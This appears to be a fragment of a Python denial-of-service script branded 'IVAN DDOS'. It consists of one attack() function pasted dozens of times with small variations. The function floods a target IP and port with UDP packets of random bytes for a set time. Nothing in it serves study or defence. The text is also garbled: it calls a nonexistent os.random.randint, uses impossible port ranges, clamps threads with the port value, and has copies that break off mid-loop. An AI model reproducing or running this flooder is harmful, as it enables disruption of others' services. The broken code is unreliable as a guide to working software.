    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
